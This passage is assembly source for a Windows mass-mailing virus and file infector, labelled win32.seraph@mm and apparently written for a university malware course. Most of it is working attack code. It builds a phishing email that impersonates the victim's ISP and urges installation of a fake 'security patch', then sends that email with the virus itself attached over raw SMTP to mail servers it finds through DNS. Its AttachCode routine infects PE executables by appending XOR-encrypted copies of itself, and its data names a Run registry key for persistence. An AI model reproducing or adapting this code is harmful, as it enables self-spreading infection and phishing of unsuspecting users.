    inc     edi
concatPath:
    pushptr szUrl
    push    edi
    ApiCall lstrcpyA   

logoParseComplete: 

;-------------------------------------------------------------------------------------------------;
; Get the company name of the ISP.                                                                ;
;-------------------------------------------------------------------------------------------------;
  
    ; copy the company name to a buffer
    lea     edi, [ebp+szIspName]
    lea     esi, [ebp+szIspDomainName]
copyCompanyName:
    mov     al, [esi]
    cmp     al, '.'
    je      companyNameCopied
    mov     [edi], al
    inc     esi
    inc     edi
    jmp     copyCompanyName
companyNameCopied:
    mov     byte ptr [edi], 0
    
    ; make the first letter upper case
    lea     edi, [ebp+szIspName]
    and     byte ptr [edi], 0DFh

;-------------------------------------------------------------------------------------------------;
; Create a deadline date for the email message                                                    ;
;-------------------------------------------------------------------------------------------------;

    ; get today's date
    pushptr date
    ApiCall GetSystemTime 

    ; set the dead line date
    mov     [ebp+date.wDay], 1
    inc     [ebp+date.wMonth]
    cmp     [ebp+date.wMonth], 13
    jl      convertDate
    mov     [ebp+date.wMonth], 1 
    inc     [ebp+date.wYear]    
      
    ; convert the date to a string
convertDate:
    push    25
    pushptr szDeadLine
    pushptr szDateFormat
    pushptr date
    push    0
    push    0
    ApiCall GetDateFormatA

;-------------------------------------------------------------------------------------------------;
; Generate a username to send the email message to.                                               ;
;-------------------------------------------------------------------------------------------------;

    xor     si, si

    ; clear the email account buffer
    push    25
    pushptr szEmailAccount
    ApiCall RtlZeroMemory

    ; generate a number from 0-1
    ApiCall GetTickCount
    and     ax, 8000h
    shr     ax, 15
    mov     si, ax
    cmp     ax, 0
    je      getName
   
    ; generate a number from 0-25
preLetter:
    ApiCall GetTickCount 
    and     ax, 7C00h
    shr     ax, 10    
    cmp     al, 26
    jge     preLetter
    add     al, 'A'
    mov     byte ptr [ebp+szEmailAccount], al  
 
    ; generate a number from 0-1023
getName:
    ApiCall GetTickCount
    and     ax, 3FFh
    xor     ecx, ecx
    mov     cx, ax 
   
    ; find the name corrusponding to the number
    lea     edi, [ebp+lastnames]
    jecxz   displayName
seekToName:    
    push    ecx
    mov     ecx, 25
    xor     al, al
    repne   scasb
    pop     ecx
    loop    seekToName
displayName:
    push    edi
    pushptr szEmailAccount
    ApiCall lstrcatA

    ; generate a trailing letter if specified
    cmp     si, 1
    je      nameComplete
postLetter:
    ApiCall GetTickCount
    and     ax, 7C00h
    shr     ax, 10    
    mov     dl, al 
    cmp     dl, 26
    jge     postLetter
    add     dl, 'A'
    xor     al, al
    lea     edi, [ebp+szEmailAccount]
    mov     ecx, 25
    repne   scasb
    mov     byte ptr [edi-1], dl  
 
nameComplete:

;-------------------------------------------------------------------------------------------------;
; Get a mail server name.                                                                         ;
;-------------------------------------------------------------------------------------------------;

    ; query a DNS server for a list of the ISP's mail servers
    push    0
    pushptr lpResults
    push    0
    push    DNS_QUERY_STANDARD
    push    DNS_TYPE_MX
    pushptr szIspDomainName
    ApiCall DnsQuery_A
    cmp     eax, 0
    jne     exitThread
    
    ; was an answer record found?
    push    size DNS_RECORD
    pushval lpResults
    pushptr dnsRecordHeader
    ApiCall RtlMoveMemory
    mov     eax, [ebp+dnsRecordHeader.flags]
    and     al, 00000011b
    cmp     al, DNSREC_ANSWER
    jne     exitThread

    ; clear the szMailServer buffer
    push    132
    pushptr szMailServer
    ApiCall RtlZeroMemory
    
    ; get the host name from the DNS response message
    mov     eax, [ebp+lpResults]
    add     eax, size DNS_RECORD
    mov     eax, [eax]
    push    eax
    pushptr szMailServer
    ApiCall lstrcpyA    
    
    ; release the DNS record list
    push    DNS_FREE_RECORD_LIST_DEEP
    pushval lpResults
    ApiCall DnsRecordListFree

;-------------------------------------------------------------------------------------------------;
; Create the email message.                                                                       ;
;-------------------------------------------------------------------------------------------------;
     
    ; allocate 4k of memory for the email message
    push    4096
    push    GMEM_FIXED
    ApiCall GlobalAlloc
    cmp     eax, 0
    je      exitThread
    mov     [ebp+lpEmailMessage], eax	

    ; clear the buffer
    push    4096
    pushval lpEmailMessage
    ApiCall RtlZeroMemory

    ; concat part 1 of the email message
    pushptr szEmailPart1
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat the ISP domain name
    pushptr szIspDomainName
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat part 2 of the email message
    pushptr szEmailPart2
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat the email account name
    pushptr szEmailAccount
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat part 3 of the email message
    pushptr szEmailPart3
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat the ISP domain name
    pushptr szIspDomainName
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat part 4 of the email message
    pushptr szEmailPart4
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat the ISP company name
    pushptr szIspName
    pushval lpEmailMessage
    ApiCall lstrcatA    
    
    ; concat part 5 of the email message
    pushptr szEmailPart5
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat the logo URL
    pushptr szLogoUrl
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat part 6 of the email message
    pushptr szEmailPart6
    pushval lpEmailMessage
    ApiCall lstrcatA   

    ; concat the ISP company name
    pushptr szIspName
    pushval lpEmailMessage
    ApiCall lstrcatA

    ; concat part 7 of the email message
    pushptr szEmailPart7
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat the ISP company name
    pushptr szIspName
    pushval lpEmailMessage
    ApiCall lstrcatA
    
    ; concat part 8 of the email message
    pushptr szEmailPart8
    pushval lpEmailMessage
    ApiCall lstrcatA    
    
    ; concat the ISP company name
    pushptr szIspName
    pushval lpEmailMessage
    ApiCall lstrcatA

    ; concat part 9 of the email message
    pushptr szEmailPart9
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat the ISP company name
    pushptr szIspName
    pushval lpEmailMessage
    ApiCall lstrcatA

    ; concat part 10 of the email message
    pushptr szEmailPart10
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat the ISP company name
    pushptr szIspName
    pushval lpEmailMessage
    ApiCall lstrcatA

    ; concat part 11 of the email message
    pushptr szEmailPart11
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat the dead line date
    pushptr szDeadLine
    pushval lpEmailMessage
    ApiCall lstrcatA

    ; concat part 12 of the email message
    pushptr szEmailPart12
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat the ISP company name
    pushptr szIspDomainName
    pushval lpEmailMessage
    ApiCall lstrcatA

    ; concat part 13 of the email message
    pushptr szEmailPart13
    pushval lpEmailMessage
    ApiCall lstrcatA    

    ; concat the ISP company name
    pushptr szIspDomainName
    pushval lpEmailMessage
    ApiCall lstrcatA

    ; concat part 14 of the email message
    pushptr szEmailPart14
    pushval lpEmailMessage
    ApiCall lstrcatA   
      
    ; get the year
    push    6
    pushptr szYear
    pushptr szYearFormat
    push    0
    push    0
    push    0
    ApiCall GetDateFormatA
        
    ; concat the year
    pushptr szYear
    pushval lpEmailMessage
    ApiCall lstrcatA   

    ; concat part 15 of the email message
    pushptr szEmailPart15
    pushval lpEmailMessage
    ApiCall lstrcatA   

    ; concat the ISP company name
    pushptr szIspName
    pushval lpEmailMessage
    ApiCall lstrcatA
    
    ; concat part 16 of the email message
    pushptr szEmailPart16
    pushval lpEmailMessage
    ApiCall lstrcatA   

;-------------------------------------------------------------------------------------------------;
; Send the email message.                                                                         ;
;-------------------------------------------------------------------------------------------------;

    ; connect to the mail server
    mov     eax, 25
    lea     esi, [ebp+szMailServer]
    call    ConnectToHost
    cmp     eax, -1
    je      exitThread
    mov     [ebp+hSock], eax

    ; set the timeout duration
    mov     eax, 5000
    mov     esi, [ebp+hSock]
    lea     edi, [ebp+dwTimeOut]
    call    SetTimeOut

    ; get the server response
    push    0
    push    256        
    pushptr szResponse
    pushval hSock
    ApiCall recv
    cmp     eax, -1
    je      exitThread

    ; create the HELO command
    pushptr szHeloPart1
    pushptr szCommand
    ApiCall lstrcpyA 
    pushptr szIspDomainName
    pushptr szCommand
    ApiCall lstrcatA 
    pushptr szHeloPart2
    pushptr szCommand
    ApiCall lstrcatA      

    ; send the HELO command
    pushptr szCommand
    ApiCall lstrlenA
    push    0
    push    eax
    pushptr szCommand
    pushval hSock
    ApiCall send
    cmp     eax, -1
    je      exitThread
  
    ; recieve the server response
    push    0
    push    256        
    pushptr szResponse   
    pushval hSock       
    ApiCall recv
    cmp     eax, -1
    je      exitThread

    ; create the MAIL FROM command
    pushptr szMailFromPart1
    pushptr szCommand
    ApiCall lstrcpyA
    pushptr szIspDomainName
    pushptr szCommand
    ApiCall lstrcatA    
    pushptr szMailFromPart2
    pushptr szCommand
    ApiCall lstrcatA
   
    ; send the MAIL FROM command
    pushptr szCommand
    ApiCall lstrlenA
    push    0
    push    eax
    pushptr szCommand
    pushval hSock
    ApiCall send
    cmp     eax, -1
    je      exitThread

    ; recieve the server response
    push    0
    push    256         
    pushptr szResponse   
    pushval hSock        
    ApiCall recv
    cmp     eax, -1
    je      exitThread

    ; create the RCPT TO command
    pushptr szRcptToPart1
    pushptr szCommand
    ApiCall lstrcpyA
    pushptr szEmailAccount
    pushptr szCommand
    ApiCall lstrcatA
    pushptr szRcptToPart2
    pushptr szCommand
    ApiCall lstrcatA
    pushptr szIspDomainName
    pushptr szCommand
    ApiCall lstrcatA
    pushptr szRcptToPart3
    pushptr szCommand
    ApiCall lstrcatA

    ; send the RCPT TO command
    pushptr szCommand
    ApiCall lstrlenA
    push    0
    push    eax
    pushptr szCommand
    pushval hSock
    ApiCall send
    cmp     eax, -1
    je      exitThread
      
    ; recieve the server response
    push    0
    push    256         
    pushptr szResponse  
    pushval hSock      
    ApiCall recv
    cmp     eax, -1
    je      exitThread

    ; create the DATA command
    pushptr szData
    pushptr szCommand
    ApiCall lstrcpyA

    ; send the DATA command
    pushptr szCommand
    ApiCall lstrlenA
    push    0
    push    eax
    pushptr szCommand
    pushval hSock
    ApiCall send
    cmp     eax, -1
    je      exitThread

    ; recieve the server response
    push    0
    push    256          
    pushptr szResponse   
    pushval hSock       
    ApiCall recv
    cmp     eax, -1
    je      exitThread

    ; send the email message
    mov     edi, [ebp+lpEmailMessage]
sendMessage:
    push    0
    push    1        
    push    edi      
    pushval hSock     
    ApiCall send
    cmp     eax, -1
    je      exitThread
    inc     edi
    cmp     byte ptr [edi], 0
    jne     sendMessage      

;-------------------------------------------------------------------------------------------------;
; Send the file attachment.                                                                       ;
;-------------------------------------------------------------------------------------------------;

    ; get the path and name of this program
    push    256
    pushptr szModuleName
    push    0
    ApiCall GetModuleFileNameA
    
    ; open this program
    push    0
    push    0
    push    OPEN_EXISTING
    push    0
    push    FILE_SHARE_READ
    push    GENERIC_READ
    pushptr szModuleName
    ApiCall CreateFileA
    cmp     eax, -1
    je      exitThread
    mov     [ebp+hFile], eax

    ; get the size of the file
    push    0
    pushval hFile
    ApiCall GetFileSize
    cmp     eax, -1
    je      exitThread

    ; calculate the number of 3 byte base64 groups
    xor     edx, edx
    mov     ebx, 3
    div     ebx
    mov     ecx, eax

    ; send the base64 encoded file data 
sendAttachment:
    push    edx
    push    ecx    

    ; read 3 bytes
    push    0
    pushptr dwNumberOfBytes
    push    3
    pushptr threeBytes
    pushval hFile
    ApiCall ReadFile   
   
    ; base64 encode the three bytes
    mov     ecx, 3
    lea     esi, [ebp+threeBytes]
    lea     edi, [ebp+fourBytes]
    call    Base64Encode

    ; send the four base64 encoded bytes
    push    0
    push    4
    pushptr fourBytes
    pushval hSock
    ApiCall send
    cmp     eax, -1
    je      exitThread    

    pop     ecx
    pop     edx
    loop    sendAttachment    

    ; get the remaining bytes
    push    edx
    push    0
    pushptr dwNumberOfBytes
    push    edx
    pushptr threeBytes
    pushval hFile
    ApiCall ReadFile
    pop     edx

    ; base64 encode the remaining bytes
    push    edx
    mov     ecx, edx
    lea     esi, [ebp+threeBytes]
    lea     edi, [ebp+fourBytes]
    call    Base64Encode       
    pop     edx

    ; send the remaining bytes
    push    0
    push    4
    pushptr fourBytes
    pushval hSock
    ApiCall send
    cmp     eax, -1
    je      exitThread        

;-------------------------------------------------------------------------------------------------;
; send the final part of the email message.                                                       ;
;-------------------------------------------------------------------------------------------------;

    ; send the last part of the email message
    pushptr szEmailPart17
    ApiCall lstrlenA
    push    0
    push    eax
    pushptr szEmailPart17
    pushval hSock
    ApiCall send
    cmp     eax, -1
    je      exitThread    

    ; recieve the server response
    push    0
    push    256      
    pushptr szResponse   
    pushval hSock       
    ApiCall recv
    cmp     eax, -1
    je      exitThread

;-------------------------------------------------------------------------------------------------;
; Clean up
;-------------------------------------------------------------------------------------------------;

    ; free the webpage buffer
    pushptr lpWebpage
    ApiCall GlobalFree

    ; free the email message buffer
    pushptr lpEmailMessage
    ApiCall GlobalFree

    ; close wininet
    pushval hInternet
    ApiCall InternetCloseHandle  

    ; close winsock
    ApiCall WSACleanup 
        
;-------------------------------------------------------------------------------------------------;
; Exit thread.                                                                                    ;
;-------------------------------------------------------------------------------------------------;

exitThread:  

    ; set the thread status
    mov     [ebp+dwThreadStatus], EXIT_THREAD
   
    ; exit the thread
    ApiCall GetCurrentThread
    
    lea     ebx, [ebp+dwExitCode]    
    push    ebx
    push    eax
    ApiCall GetExitCodeThread
       
    pushval dwExitCode
    ApiCall ExitThread              

;-------------------------------------------------------------------------------------------------;
; Function(s)                                                                                     ;
;-------------------------------------------------------------------------------------------------;

Base64Encode    PROC
    ;
    ; Description:
    ;   Base64 encodes a group of bytes.
    ;
    ; Parameters:
    ;   ecx = Number of bytes to encode.
    ;   esi = pointer to a buffer that needs encoding.
    ;   edi = pointer to a buffer that will recieve the encoded data.
    ;
    ; Return Values:
    ;   None.
    ;
    cmp     ecx, 3
    jl      @@pad                                  ; no groups of 3 to convert?
    xor     edx, edx
    mov     eax, ecx
    mov     ebx, 3
    div     ebx                                    ; edx = number of padded bytes
    mov     ecx, eax    
@@base64:                                          ; encode groups of 3 bytes to base64
    lodsd
    dec     esi
    bswap   eax
    push    ecx
    mov     ecx, 4
@@encode3:
    rol     eax, 6
    push    eax        
    and     eax, 3fh
    mov     al, [ebp+@@charset+eax]                ; get the base64 character
    stosb
    pop     eax 
    loop    @@encode3    
    pop     ecx
    loop    @@base64
    mov     ecx, edx
    cmp     edx, 3
    jg      @@return
@@pad:                                             ; pad any additional bytes
    inc     ecx
    mov     dword ptr [edi], '===='
    mov     eax, [esi]
    bswap   eax
@@l1: 
    rol     eax, 6
    push    eax
    and     eax, 3fh
    mov     al, [ebp+@@charset+eax]
    stosb
    pop     eax
    loop    @@l1     
@@return:
    ret
@@charset   DB 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/', 0
Base64Encode    ENDP
        
SetTimeOut  PROC   
    ;
    ; Description:
    ;   Sets the timeout duration for sending and recieving data.
    ;
    ; Parameters:
    ;   esi = socket handle.
    ;   edi = pointer to a DWORD.
    ;   eax = timeout duration.
    ;
    ; Return Values:
    ;   None.
    ;

    ; set the timeout duration
    mov      [edi], eax
  
    ; set the timeout for recieving data 
    push     4
    push     edi
    push     SO_RCVTIMEO
    push     SOL_SOCKET
    push     esi
    ApiCall  setsockopt
  
    ; set the timeout for sending data
    push     4
    push     edi
    push     SO_SNDTIMEO
    push     SOL_SOCKET
    push     esi
    ApiCall  setsockopt
  
    ret
SetTimeOut  ENDP

LoadImports     PROC
    ;
    ; Description:
    ;   Loads a series a dll's and the addresses of the specified functions.
    ;
    ; Parameters:
    ;   eax = pointer to an import table.
    ;
    ; Return Values:
    ;   If the function is successful the return value is 0. If the function fails 
    ;   the return value is -1.
    ;
    mov     edi, eax
@@loadLibrary:
    push    edi
    ApiCall LoadLibraryA                           ; load the dll
    cmp     eax, 0
    je      apiLoadError
    mov     esi, eax
    xor     al, al
    mov     ecx, 100
    repne   scasb                                  ; find the dll pointer
@@loadFunctions:    
    push    edi
    push    esi
    ApiCall GetProcAddress                         ; get function address
    cmp     eax, 0
    je      apiLoadError   
    mov     ebx, eax                    
    xor     al, al
    mov     ecx, 100
    repne   scasb                                  ; find function pointer    
    mov     [edi], ebx                             ; save the function address
    add     edi, 4
    cmp     byte ptr [edi], 0                      ; end of function list?
    jne     @@loadFunctions
    inc     edi
    cmp     byte ptr [edi], '$'                    ; end of import list?
    jne     @@loadLibrary
    xor     eax, eax
    ret
@@apiLoadError:
    mov     eax, -1
    ret
LoadImports     ENDP

ConnectToHost   PROC
    ;
    ; Description:
    ;   Connects to a host.
    ;
    ; Parameters:
    ;   eax = port.
    ;   esi = pointer to a zero terminated host name.
    ;
    ; Return Values:
    ;   If the function is successful the return value is the socket handle. If the function fails 
    ;   the return value is -1.
    ;

    ; fill the SOCK_ADDRESS structure
    mov     [ebp+sockAddress.sin_family], AF_INET
    push    eax   
    ApiCall htons
    mov     [ebp+sockAddress.sin_port], ax
    push    esi
    ApiCall gethostbyname
    cmp     eax, 0
    je      @@connectionFailed
    mov     eax, [eax+12]        
    mov     eax, [eax]
    mov     eax, [eax]
    mov     [ebp+sockAddress.sin_addr], eax

    ; Create a socket 
    push    PCL_NONE            
    push    SOCK_STREAM                 
    push    AF_INET          
    ApiCall socket
    mov     esi, eax
    cmp     eax, -1
    je      @@connectionFailed      

    ; connect to host
    push    16
    pushptr sockAddress
    push    esi
    ApiCall connect
    cmp     eax, 0
    jne     @@connectionFailed
    mov     eax, esi
    ret

@@connectionFailed:
    mov     eax, -1
    ret
ConnectToHost   ENDP       

IsValid     PROC
    ;
    ; Description:
    ;   Checks to see if the file is a valid win32 exe and is not already infected.
    ;
    ; Parameters:
    ;   esi = Pointer to filename.
    ;
    ; Return Values:
    ;   If the function is successful the return value is 0. If the function fails the return
    ;   value is -1.
    ;

    ; open the file
    push    0
    push    0
    push    OPEN_EXISTING
    push    0
    push    FILE_SHARE_WRITE OR FILE_SHARE_READ
    push    GENERIC_WRITE OR GENERIC_READ
    push    esi
    ApiCall CreateFileA
    cmp     eax, -1
    je      @@notValid 
    mov     [ebp+hFile], eax

    ; read the DOS header into memory
    push    0
    pushptr dwNumberOfBytes
    push    size DOS_HEADER
    pushptr dosHeader
    pushval hFile
    ApiCall ReadFile   
    cmp     word ptr [ebp+dosHeader.wSignature], 'ZM'
    jne     @@notValid

    ; seek to the PE header
    push    FILE_BEGIN
    push    0
    pushval dosHeader.lpPEHeader
    pushval hFile
    ApiCall SetFilePointer         

    ; read the PE header into memory
    push    0
    pushptr dwNumberOfBytes
    push    size PE_HEADER
    pushptr peHeader
    pushval hFile
    ApiCall ReadFile                
    
    ; is it a win32 exe file?
    cmp     word ptr [ebp+peHeader.dwSignature], 'EP' 
    jne     @@notValid

    ; calculate the location of the last section header
    xor     edx, edx
    xor     eax, eax
    mov     ax, [ebp+peHeader.wNumberOfSections]
    dec     eax
    mov     ebx, size SECTION_HEADER
    mul     ebx
    add     eax, [ebp+dosHeader.lpPEHeader]
    add     eax, size PE_HEADER
    mov     [ebp+lpLastSectionHeader], eax

    ; seek to the last section header
    push    FILE_BEGIN
    push    0
    pushval lpLastSectionHeader
    pushval hFile
    ApiCall SetFilePointer             
    
    ; read the last section header into memory
    push    0
    pushptr dwNumberOfBytes
    push    size SECTION_HEADER
    pushptr sectionHeader
    pushval hFile
    ApiCall ReadFile               

    ; code already attached?
    cmp     dword ptr [ebp+sectionHeader.dwCharacteristics], SECTION_RWE
    je      @@notValid
    
@@isValid:
    pushval hFile
    ApiCall CloseHandle    
    xor     eax, eax
    ret        
    
@@notValid:
    pushval hFile
    ApiCall CloseHandle
    mov     eax, -1
    ret
 
IsValid     ENDP

AttachCode  PROC
    ;
    ; Description:
    ;   Infects a win32 exe with this program.
    ;
    ; Parameters:
    ;   esi = Pointer to filename.
    ;
    ; Return Values:
    ;   If the function is successful the return value is 0. If the function fails the return
    ;   value is -1.
    ;
    
    ; save the return address for this instance    
    push    [ebp+lpReturnAddress]

    ; open the file
    push    0
    push    0
    push    OPEN_EXISTING
    push    0
    push    FILE_SHARE_WRITE OR FILE_SHARE_READ
    push    GENERIC_WRITE OR GENERIC_READ
    push    esi
    ApiCall CreateFileA
    cmp     eax, -1
    je      @@attachFailure 
    mov     [ebp+hFile], eax

    ; read the DOS header into memory
    push    0
    pushptr dwNumberOfBytes
    push    size DOS_HEADER
    pushptr dosHeader
    pushval hFile
    ApiCall ReadFile    

    ; seek to the PE header
    push    FILE_BEGIN
    push    0
    pushval dosHeader.lpPEHeader
    pushval hFile
    ApiCall SetFilePointer          

    ; read the PE header into memory
    push    0
    pushptr dwNumberOfBytes
    push    size PE_HEADER
    pushptr peHeader
    pushval hFile
    ApiCall ReadFile                

    ; update the image size
    add     dword ptr [ebp+peHeader.dwSizeOfImage], ((CODE_SIZE + (1000h - 1)) AND 0FFFFF000h)

    ; use the program entry point as a return address
    mov     eax, [ebp+peHeader.dwAddressOfEntryPoint]
    mov     [ebp+lpReturnAddress], eax

    ; calculate the location of the last section header
    xor     edx, edx
    xor     eax, eax
    mov     ax, [ebp+peHeader.wNumberOfSections]
    dec     eax
    mov     ebx, size SECTION_HEADER
    mul     ebx
    add     eax, [ebp+dosHeader.lpPEHeader]
    add     eax, size PE_HEADER
    mov     [ebp+lpLastSectionHeader], eax

    ; seek to the last section header
    push    FILE_BEGIN
    push    0
    pushval lpLastSectionHeader
    pushval hFile
    ApiCall SetFilePointer             
    
    ; read the last section header into memory
    push    0
    pushptr dwNumberOfBytes
    push    size SECTION_HEADER
    pushptr sectionHeader
    pushval hFile
    ApiCall ReadFile               

    ; point the program entry point to this code
    mov     eax, [ebp+sectionHeader.dwVirtualAddress]
    add     eax, [ebp+sectionHeader.dwSizeOfRawData]
    mov     [ebp+peHeader.dwAddressOfEntryPoint], eax

    ; calculate the location in the file where the code should go
    mov     eax, [ebp+sectionHeader.dwPointerToRawData]
    add     eax, [ebp+sectionHeader.dwSizeOfRawData]
    mov     [ebp+lpCode], eax  

    ; seek to that location
    push    FILE_BEGIN
    push    0
    pushval lpCode
    pushval hFile
    ApiCall SetFilePointer   

    ; write the decryption code to the file
    push    0
    pushptr dwNumberOfBytes
    push    (offset encrypted - offset main)
    pushval lpStartOfCode
    pushval hFile
    ApiCall WriteFile

    ; write the encrypted code to the file
    mov     ecx, CODE_SIZE - (offset encrypted - offset main)
    xor     esi, esi
encrypt:
    push    ecx
    mov     al, byte ptr [ebp+esi+encrypted]
    xor     al, 123
    mov     [ebp+cByte], al
    push    0
    pushptr dwNumberOfBytes
    push    1
    pushptr cByte
    pushval hFile
    ApiCall WriteFile
    inc     esi
    pop     ecx
    loop    encrypt    

    ; update the virtual size of the section
    add     [ebp+sectionHeader.dwVirtualSize], ((CODE_SIZE + (1000h - 1)) AND 0FFFFF000h)

    ; update the size of raw data
    add     [ebp+sectionHeader.dwSizeOfRawData], ((CODE_SIZE + (200h - 1)) AND 0FFFFFE00h)

    ; make the section readable/writable/executable
    mov     [ebp+sectionHeader.dwCharacteristics], SECTION_RWE    

    ; seek to the last section header
    push    FILE_BEGIN
    push    0
    pushval lpLastSectionHeader
    pushval hFile
    ApiCall SetFilePointer   

    ; write the updated section header back to the file
    push    0
    pushptr dwNumberOfBytes
    push    size SECTION_HEADER
    pushptr sectionHeader
    pushval hFile
    ApiCall WriteFile

    ; seek to the PE Header 
    push    FILE_BEGIN
    push    0
    pushval dosHeader.lpPEHeader
    pushval hFile
    ApiCall SetFilePointer          

    ; write the updated PE header back to the file
    push    0
    pushptr dwNumberOfBytes
    push    size PE_HEADER
    pushptr peHeader
    pushval hFile
    ApiCall WriteFile

    ; update the file size to a multiple of 4096   
    push    FILE_END
    push    0
    push    0
    pushval hFile
    ApiCall SetFilePointer        
    mov     ebx, eax
    add     eax, (1000h - 1)
    and     eax, 0FFFFF000h
    sub     eax, ebx
    mov     ecx, eax
@@zeroFill:
    jecxz   @@attachSuccess 
    push    ecx
    push    0
    pushptr dwNumberOfBytes
    push    1
    pushptr cZero
    pushval hFile
    ApiCall WriteFile    
    pop     ecx
    dec     ecx        
    jmp     @@zeroFill
    
@@attachSuccess:

    ; restore the return address
    pop     [ebp+lpReturnAddress]

    ; close the file handle
    pushval hFile
    ApiCall CloseHandle

    ; return success code
    xor     eax, eax
    ret

@@attachFailure:

    ; restore the return address
    pop     [ebp+lpReturnAddress]

    ; return failure code
    mov     eax, -1
    ret
    
AttachCode  ENDP

;-------------------------------------------------------------------------------------------------;
; Data Section                                                                                    ;
;-------------------------------------------------------------------------------------------------;

    ; >:) im so evil, so so evil...
    szSigntaure         DB 'University of Calgary', CRLF
                        DB 'Semester: 4', CRLF
                        DB 'Course: Computer Viruses and Malware', CRLF
                        DB 'Virus Name: win32.seraph@mm', CRLF
                        DB 'Virus Type: Mass Mailer/File Infector', CRLF, 0

    ; date formating
    szDateFormat        DB 'MMMM, d, yyyy', 0
    szYearFormat        DB 'yyyy', 0
    date                SYSTEM_TIME <0>

    ; file finding data
    szDrive             DB 'A:\', 0
    hFind               DD 0
    szSearchString      DB '*.*', 0
    szBackDir           DB '..', 0 
    win32FindData       WIN32_FIND_DATA <0>

    ; wininet data
    dwConnectionState   DD 0
    hInternet           DD 0
  
    ; SMTP data
    szResponse          DB 256 DUP(0)
    szCommand           DB 256 DUP(0)
    dwTimeOut           DD 0
    hSock               DD 0
    szHeloPart1         DB 'HELO ', 0
    szHeloPart2         DB CRLF, 0
    szMailFromPart1     DB 'MAIL FROM: <news@', 0
    szMailFromPart2     DB '>', CRLF, 0
    szRcptTo            DB 132 DUP(0)
    szRcptToPart1       DB 'RCPT TO: <', 0
    szRcptToPart2       DB '@', 0
    szRcptToPart3       DB '>', CRLF, 0
    szData              DB 'DATA', CRLF, 0
    szDot               DB CRLF, '.', CRLF, 0
    szQuit              DB 'QUIT', CRLF, 0    
    threeBytes          DB 0, 0, 0                 ; holds 3 ascii bytes
    fourBytes           DB 0, 0, 0, 0              ; holds 3 base64 encoded bytes
    szMailServer        DB 132 DUP(0)
    lpEmailMessage      DD 0
    szEmailAccount      DB 25 DUP(0)

    ; registry data
    szSubKey            DB 'Software\Microsoft\Windows\CurrentVersion\Run', 0
    hKey                DD 0    
    szModuleName        DB 256 DUP(0)
    szValueName         DB 'Start-Up', 0
   
    ; dynamic variables (vary from generation to generation)
    lpReturnAddress     DD 0
    lpStartOfCode       DD 0
    lpImageBase         DD 0

    ; DNS data
    lpResults           DD 0
    dnsRecordHeader     DNS_RECORD <0>

    ; PE data
    peHeader            PE_HEADER <0>
    dosHeader           DOS_HEADER <0>
    sectionHeader       SECTION_HEADER <0>
    lpLastSectionHeader DD 0
    lpCode              DD 0
    cZero               DB 0    
    cByte               DB 0
   
    ; thread data
    hThread             DD 0
    dwThreadStatus      DD 0   
    dwExitCode          DD 0

    ; file I/O data
    hFile               DD 0
    dwNumberOfBytes     DD 0

    ; MISC data
    wsaData             WSA_DATA <0>      
    szArpa              DB '.in-addr.arpa', 0
    lpWebpage           DD 0
    dwWebpageSize       DD 0
    szWWW               DB 'http://www.', 0
    szUrl               DB 132 DUP(0)    
    sockAddress         SOCK_ADDRESS <0>
    szIkxParameter      DB ' /iKX', 0
    szPatchName         DB 'patch110.exe', 0
    szPatchTitle        DB 'Installation Complete!', 0
    szPatchInstall      DB 'Thankyou for installing the security patch version 1.10.', 0 
    szCurrentDirectory  DB 256 DUP(0)
    szSystemDirectory   DB 257 DUP(0)
    szSlash             DB '\', 0

    ; collected data
    szHostName          DB 132 DUP(0)
    szReverseIP         DB 29 DUP(0)
    szIspDomainName     DB 132 DUP(0)
    szIspWebpage        DB 132 DUP (0)
    szLogoUrl           DB 132 DUP(0) 
    szIspName           DB 25 DUP(0)
    szDeadLine          DB 25 DUP(0)
    szYear              DB 5 DUP(0)
    
    ; dll data
    lpKernel32          DD 0
    szLoadLibraryA      DB 'LoadLibraryA', 0
    LoadLibraryA        DD 0
    GetProcAddress      DD 0    

    ; email message
    szEmailPart1        DB 'From: news@', 0
    szEmailPart2        DB CRLF
                        DB 'To: ', 0
    szEmailPart3        DB '@', 0
    szEmailPart4        DB CRLF
                        DB 'Subject: Important information involving your ', 0
    szEmailPart5        DB ' Internet account.', CRLF    
                        DB 'MIME-Version: 1.0', CRLF
                        DB 'Content-Type: multipart/mixed; boundary="Boundary.11111111.11111111"', CRLF
                        DB CRLF
                        DB 'This is a multipart message in MIME format.', CRLF
                        DB CRLF
                        DB '--Boundary.11111111.11111111', CRLF
                        DB 'Content-Type: text/html', CRLF
                        DB CRLF 
                        DB '<html>', CRLF
                        DB '<body bgcolor = "white">', CRLF
                        DB '<table align = center width = 400 border = 1 cellspacing = 0 cellpadding = 0 bordercolor = 0>', CRLF
                        DB '<tr>', CRLF
                        DB '<td>', CRLF
                        DB '<table border = 0 cellspacing = 5 cellpadding = 5 width = 100%>', CRLF
                        DB '<tr>', CRLF
                        DB '<td>', CRLF
                        DB '<center><img src = "', 0
    szEmailPart6        DB '"></center>', CRLF
                        DB '<p>', CRLF
                        DB '<font face="Arial, Helvetica, sans-serif" size="2">', CRLF
                        DB 'Dear ', 0
    szEmailPart7        DB ' customer<p>', CRLF
                        DB 'We at ', 0
    szEmailPart8        DB ' have been working hard at increasing the reliability and security of our service. ' 
                        DB 'To date the following changes have been made:<p>', CRLF
                        DB '<ul>', CRLF
                        DB '<li>All emails sent to your ', 0 
    szEmailPart9        DB ' email account are now screened for viruses and other malware.<p></li>', CRLF
                        DB '<li>A virtual firewall has been set up to protect your system from attacks by hackers.<p></li>', CRLF
                        DB '<li>A new update is available to protect your computer while online. (Read more below)<p></li>', CRLF 
                        DB '</ul>', CRLF
                        DB 'All ', 0
    szEmailPart10       DB ' customers are required to install our latest security update attached to this email. '
                        DB 'It contains a series of patches from Microsoft, Norton and McAffee that will protect '
